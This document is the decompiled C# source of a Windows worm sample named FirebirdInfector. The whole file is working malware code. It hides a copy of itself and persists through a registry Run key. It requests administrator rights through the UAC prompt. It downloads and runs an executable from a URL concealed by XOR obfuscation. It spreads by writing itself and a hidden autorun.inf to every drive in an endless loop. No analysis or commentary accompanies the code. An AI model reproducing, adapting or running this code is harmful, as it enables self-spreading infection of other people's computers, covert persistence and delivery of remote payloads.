// Decompiled with JetBrains decompiler
// Type: FirebirdInfector.Program
// Assembly: FirebirdInfector, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 773E8D11-B9A0-4F9D-A688-E114E4089C73
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.ic-643fc26db05ef8f5bd47bc03df1ed69574a39e1d4d96b3fcea184c2d7d9b9025.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

namespace FirebirdInfector
{
  internal class Program
  {
    private static string EncryptDecrypt(string textToEncrypt)
    {
      int num = 129;
      StringBuilder stringBuilder1 = new StringBuilder(textToEncrypt);
      StringBuilder stringBuilder2 = new StringBuilder(textToEncrypt.Length);
      for (int index = 0; index < textToEncrypt.Length; ++index)
      {
        char ch = (char) ((uint) stringBuilder1[index] ^ (uint) num);
        stringBuilder2.Append(ch);
      }
      return stringBuilder2.ToString();
    }

    private static void pathCheck(string normalPath, string currentPath)
    {
      if (!(normalPath != currentPath))
        return;
      if (!System.IO.File.Exists(normalPath))
      {
        System.IO.File.Copy(currentPath, normalPath, true);
        System.IO.File.SetAttributes(normalPath, System.IO.File.GetAttributes(normalPath) | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
      }
      Process.Start(new ProcessStartInfo()
      {
        FileName = normalPath
      });
      Environment.Exit(0);
    }

    private static void RunElevated(string fileName)
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.Verb = "runas";
      startInfo.FileName = fileName;
      startInfo.Arguments = "runasadmin";
      try
      {
        Process.Start(startInfo);
      }
      catch (Win32Exception ex)
      {
        Console.WriteLine("Probably the user canceled the UAC window...");
      }
    }

    private static void startupCheck(bool runasadmin)
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
      if (registryKey.GetValue("oleaut_32") == null)
      {
        try
        {
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          registryKey.SetValue("oleaut_32", (object) ("\"" + Path.GetFullPath(Assembly.GetExecutingAssembly().Location) + "\""));
        }
        catch (Exception ex)
        {
          if (runasadmin)
          {
            Program.RunElevated(Path.GetFullPath(Assembly.GetExecutingAssembly().Location));
            Environment.Exit(0);
          }
          else
            Console.WriteLine("Cant write to registry...");
        }
      }
      registryKey.Close();
    }

    private static void downloadExec(string executableURL, string executablePath)
    {
      try
      {
        WebClient webClient = new WebClient();
        if (System.IO.File.Exists(executablePath))
          System.IO.File.SetAttributes(executablePath, FileAttributes.Normal);
        webClient.DownloadFile(executableURL, executablePath);
        System.IO.File.SetAttributes(executablePath, System.IO.File.GetAttributes(executablePath) | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
      }
      catch (WebException ex)
      {
        Console.WriteLine("Cannot download executable, continuing...");
      }
    }

    private static void runExec(string executablePath)
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.FileName = executablePath;
      try
      {
        Process.Start(startInfo);
      }
      catch (Win32Exception ex)
      {
        Console.WriteLine("Cannot run executable, continuing...");
      }
    }

    private static void infectP2P(string currentPath)
    {
      string[] strArray = new string[0];
      Path.GetFullPath(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\eMule\\Incoming\\");
      Path.GetFullPath(Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Ares\\My Shared Folder\\");
    }

    private static void WriteToFile(string file, string content)
    {
      StreamWriter text = System.IO.File.CreateText(file);
      text.WriteLine(content);
      text.Close();
    }

    private static void copy2Drives(string autorunEXE, string currentPath, string[] autorunINF)
    {
label_14:
      foreach (string logicalDrive in Environment.GetLogicalDrives())
      {
        if (logicalDrive != "A:\\" && logicalDrive != "B:\\")
        {
          if (new DriveInfo(logicalDrive).DriveType.ToString() != "CDRom")
          {
            try
            {
              if (System.IO.File.Exists(logicalDrive + autorunEXE))
                System.IO.File.SetAttributes(logicalDrive + autorunEXE, FileAttributes.Normal);
              if (System.IO.File.Exists(logicalDrive + "autorun.inf"))
                System.IO.File.SetAttributes(logicalDrive + "autorun.inf", FileAttributes.Normal);
              System.IO.File.Copy(currentPath, logicalDrive + autorunEXE, true);
              System.IO.File.SetAttributes(logicalDrive + autorunEXE, System.IO.File.GetAttributes(logicalDrive + autorunEXE) | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
              System.IO.File.WriteAllLines(logicalDrive + "autorun.inf", autorunINF);
              System.IO.File.SetAttributes(logicalDrive + "autorun.inf", System.IO.File.GetAttributes(logicalDrive + "autorun.inf") | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
            }
            catch (UnauthorizedAccessException ex)
            {
              Console.WriteLine("Can't write to " + logicalDrive + " (Unauthorized)...");
            }
            catch (IOException ex)
            {
              Console.WriteLine("Can't write to " + logicalDrive + " (I\\O Error)...");
            }
            Thread.Sleep(3000);
          }
        }
      }
      goto label_14;
    }

    private static void Main(string[] args)
    {
      string fullPath1 = Path.GetFullPath((Environment.GetEnvironmentVariable("PUBLIC") ?? "C:\\Documents and Settings\\All Users\\Documentos") + "\\oleaut_32.exe");
      string fullPath2 = Path.GetFullPath(Assembly.GetExecutingAssembly().Location);
      string executableURL = Program.EncryptDecrypt("éõõñ»®®õóëâîïïäâõ¯ïî¬èñ¯îóæ®õóë®ìàèï¯äùä");
      string fullPath3 = Path.GetFullPath(Environment.GetEnvironmentVariable("PUBLIC") + "\\main.exe");
      string autorunEXE = "autorun.exe";
      string[] autorunINF = new string[10]
      {
        Program.EncryptDecrypt("ÚàôõîóôïÜ"),
        Program.EncryptDecrypt("îñäï\u00BCâìå¡®â¡£äùñíîóäó¡¯¡§¡") + autorunEXE + Program.EncryptDecrypt("£"),
        Program.EncryptDecrypt("òéäííäùäâôõä\u00BCâìå¡®â¡£äùñíîóäó¡¯¡§¡") + autorunEXE + Program.EncryptDecrypt("£"),
        Program.EncryptDecrypt("òéäííÝàãóèó\u00BC§Àãóèó¡äï¡âàóñäõà"),
        Program.EncryptDecrypt("òéäííÝàãóèóÝâîììàïå\u00BCâìå¡®â¡£äùñíîóäó¡¯¡§¡") + autorunEXE + Program.EncryptDecrypt("£"),
        Program.EncryptDecrypt("òéäíí\u00BCàãóèó"),
        Program.EncryptDecrypt("òéäííÝäùñíîóàó\u00BC§Äùñíîóàó"),
        Program.EncryptDecrypt("òéäííÝäùñíîóàóÝâîììàïå\u00BCâìå¡®â¡£äùñíîóäó¡¯¡§¡") + autorunEXE + Program.EncryptDecrypt("£"),
        Program.EncryptDecrypt("òéäíí\u00BCäùñíîóàó"),
        Program.EncryptDecrypt("ÔòäÀôõîÑíàø\u00BC°")
      };
      bool runasadmin = args.Length == 0;
      Program.pathCheck(fullPath1, fullPath2);
      Program.startupCheck(runasadmin);
      Program.downloadExec(executableURL, fullPath3);
      Program.runExec(fullPath3);
      Program.infectP2P(fullPath2);
      Program.copy2Drives(autorunEXE, fullPath2, autorunINF);
      Thread.Sleep(5000);
    }
  }
}
